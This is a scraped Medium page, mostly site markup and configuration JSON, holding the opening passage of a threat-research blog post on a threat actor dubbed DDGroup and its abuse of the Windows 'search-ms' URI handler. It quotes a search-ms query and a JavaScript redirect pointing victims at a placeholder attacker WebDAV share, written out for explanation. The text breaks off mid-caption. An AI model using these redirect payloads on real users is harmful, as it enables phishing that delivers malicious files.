rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="uj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241101-141657-368ddd3325"</script><script>window.__GRAPHQL_URI__ = "https://gi7w0rm.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-d3b3020625a4","user-fa7639fc99f0"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false,"publicationHierarchyEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"USER","id":"fa7639fc99f0","explicit":true},"viewerIsBot":false},"debug":{"requestId":"6cbf5d45-c958-48c4-a2f4-fa978bc54d72","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-0284122dc4c9f11bc1d81545ccefe0de-1320f57727f8ab6c-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fgi7w0rm.medium.com\u002Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4","host":"gi7w0rm.medium.com","hostname":"gi7w0rm.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20241101-141657-368ddd3325","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241101-141657-368ddd3325","commit":"368ddd33257676ac7efa246a2596cb30755c7d31"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"gi7w0rm.medium.com\"})":null,"postResult({\"id\":\"d3b3020625a4\"})":{"__ref":"Post:d3b3020625a4"}},"LinkedAccounts:fa7639fc99f0":{"__typename":"LinkedAccounts","mastodon":null,"id":"fa7639fc99f0"},"UserViewerEdge:userId:fa7639fc99f0-viewerId:lo_44ffdc9afcea":{"__typename":"UserViewerEdge","id":"userId:fa7639fc99f0-viewerId:lo_44ffdc9afcea","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:3a4e97b76a4b":{"__typename":"NewsletterV3","id":"3a4e97b76a4b","type":"NEWSLETTER_TYPE_AUTHOR","slug":"fa7639fc99f0","name":"fa7639fc99f0","collection":null,"user":{"__ref":"User:fa7639fc99f0"}},"User:fa7639fc99f0":{"__typename":"User","id":"fa7639fc99f0","name":"Gi7w0rm","username":"gi7w0rm","newsletterV3":{"__ref":"NewsletterV3:3a4e97b76a4b"},"linkedAccounts":{"__ref":"LinkedAccounts:fa7639fc99f0"},"isSuspended":false,"imageId":"1*XNZYIunppMSwHbb0Dxx3cA.png","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":193},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"gi7w0rm.medium.com"}},"hasSubdomain":true,"bio":"","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:fa7639fc99f0-viewerId:lo_44ffdc9afcea"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"userPostCounts({\"includeResponsesCount\":true})":null,"membership":null,"allowNotes":true,"twitterScreenName":"Gi7w0rm"},"Paragraph:1d3124020da0_0":{"__typename":"Paragraph","id":"1d3124020da0_0","name":"f9c5","type":"H3","href":null,"layout":null,"metadata":null,"text":"Uncovering DDGroup — A long-time threat actor","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_1":{"__typename":"Paragraph","id":"1d3124020da0_1","name":"684d","type":"P","href":null,"layout":null,"metadata":null,"text":"Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems noteworthy, or something that just sticks with you. This blog post is the result of just that. But let's start from the beginning…","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_2":{"__typename":"Paragraph","id":"1d3124020da0_2","name":"3007","type":"H4","href":null,"layout":null,"metadata":null,"text":"Summary:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_3":{"__typename":"Paragraph","id":"1d3124020da0_3","name":"35e8","type":"P","href":null,"layout":null,"metadata":null,"text":"In the following blog post, we are going to have a look at a new attacker group I discovered by sheer coincidence. I will start off by describing a new attack vector described by Trellix Security, which abuses the “search-ms” URI handler to trick victims into opening a malicious file. From there, I will describe the encounter of an in-the-wild attack, which unexpectedly led me to the discovery of tons of indicators related to a Threat Actor that has been mentioned in several articles since February 2022, but has never been named or specifically described. I was able to track back their activity to at least the beginning of 2019, but I do believe the activity goes far beyond that. I am going to introduce their lures, some of the campaigns they have done so far, and some specific characteristics they show. Buckle up, it is probably going to be a long and interesting read. ^^","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_4":{"__typename":"Paragraph","id":"1d3124020da0_4","name":"a6b6","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 1: The “search-ms” URI handler abuse","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_5":{"__typename":"Paragraph","id":"1d3124020da0_5","name":"65ae","type":"P","href":null,"layout":null,"metadata":null,"text":"On August 7, 2023, researchers at security company Trellix released a post about a new kind of attack vector, targeting Windows Users via the “search-ms” protocol. While the theory behind this attack vector is not new, Trellix had observed it in several in-the-wild attacks, bundled with some new methods to compromise users.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":70,"end":74,"href":"https:\u002F\u002Fwww.trellix.com\u002Fen-us\u002Fabout\u002Fnewsroom\u002Fstories\u002Fresearch\u002Fbeyond-file-search-a-novel-method.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_6":{"__typename":"Paragraph","id":"1d3124020da0_6","name":"7bd4","type":"P","href":null,"layout":null,"metadata":null,"text":"“search-ms” is a URI handler implemented in Microsoft Windows. If my research is correct it has been introduced in Windows XP and has been present and expanded on ever since. To understand how this protocol works, here is a sample query as taken from an actual attack:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":1,"end":10,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsearch\u002Fgetting-started-with-parameter-value-arguments","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_7":{"__typename":"Paragraph","id":"1d3124020da0_7","name":"e48a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"search-ms:query=Invoice_4532&crumb=location:\\\\\\\\[AttackerIP]@5000\\\\DavWWWRoot&displayname=Search'","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_8":{"__typename":"Paragraph","id":"1d3124020da0_8","name":"536a","type":"P","href":null,"layout":null,"metadata":null,"text":"This query has several parts. Let's look at them individually to better grasp what is going on:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_9":{"__typename":"Paragraph","id":"1d3124020da0_9","name":"91c3","type":"OLI","href":null,"layout":null,"metadata":null,"text":"search-ms : This is the URI handler in question. Similar to “http:” or “ldap” it defines the protocol used to handle a specific URI. In this case the rest of the string defines a query to be handled by Windows Search.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_10":{"__typename":"Paragraph","id":"1d3124020da0_10","name":"9e07","type":"OLI","href":null,"layout":null,"metadata":null,"text":"query=Invoice_4532 : This part defines what should be searched for. In this case we will search the location given in the next argument for the term “Invoice_4532”.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_11":{"__typename":"Paragraph","id":"1d3124020da0_11","name":"31bc","type":"OLI","href":null,"layout":null,"metadata":null,"text":"crumb=location: : This feature is implemented since Windows Vista and supports AQL statements. It is used to narrow the scope of where a query should be searched.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_12":{"__typename":"Paragraph","id":"1d3124020da0_12","name":"71b0","type":"OLI","href":null,"layout":null,"metadata":null,"text":"location:\\\\\\\\[AttackerIP]@5000\\\\DavWWWRoot : This is the location we want to search. It is actually where the main magic happens because, besides locations that are on your local device, this parameter actually allows you to search remote locations as well. However, if everything works as intended, there is no actual warning that the user is querying a remote drive. An inexperienced user might not even notice it at all. Note that the part behind the “@” symbol is actually the port and path used.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":44,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_13":{"__typename":"Paragraph","id":"1d3124020da0_13","name":"f3e6","type":"OLI","href":null,"layout":null,"metadata":null,"text":"displayname=Search : This argument defines the name shown in the explorer window for the particular query.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_14":{"__typename":"Paragraph","id":"1d3124020da0_14","name":"8993","type":"P","href":null,"layout":null,"metadata":null,"text":"Trellix observed that the above-described URI handler was abused in a set of attacks where an attacker would make a victim (unknowingly) open a search URL that queried an attacker-controlled server. Initiated through either a direct phishing link sent to the victim or through a malicious attachment, the victim would be redirected to search for a specific file name (aligning with the lure) on an attacker-controlled server. In most cases this was done by having the victim open a webpage, which had the following javascript redirect included:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_15":{"__typename":"Paragraph","id":"1d3124020da0_15","name":"814d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u003Cscript\u003E\nwindow.location.href = 'search-ms:query=[Filename]&crumb=location:\\\\\\\\[Attacker_IP]\\\\DavWWWRoot&displayname=[Displayname]';\n\u003C\u002Fscript\u003E\n","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"xml"},"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_16":{"__typename":"Paragraph","id":"1d3124020da0_16","name":"17c1","type":"P","href":null,"layout":null,"metadata":null,"text":"Upon opening this page, the victim would be prompted to open the page with the adequate application (Windows Explorer), as seen in the image below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*M7Ll2pMy4J_SOed9OrCC8Q.png":{"__typename":"ImageMetadata","id":"1*M7Ll2pMy4J_SOed9OrCC8Q.png","originalHeight":334,"originalWidth":1305,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_17":{"__typename":"Paragraph","id":"1d3124020da0_17","name":"179f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*M7Ll2pMy4J_SOed9OrCC8Q.png"},"text":"Figure 1: Redirect to Windows Explorer","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_18":{"__typename":"Paragraph","id":"1d3124020da0_18","name":"225e","type":"P","href":null,"layout":null,"metadata":null,"text":"If permitted, the victim would be greeted by this:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*NjzYuHM9aZfRBOnlKpRWPg.png":{"__typename":"ImageMetadata","id":"1*NjzYuHM9aZfRBOnlKpRWPg.png","originalHeight":403,"originalWidth":1920,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_19":{"__typename":"Paragraph","id":"1d3124020da0_19","name":"fbb0","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*NjzYuHM9aZfRBOnlKpRWPg.png"},"text":"Figure 2: Query from 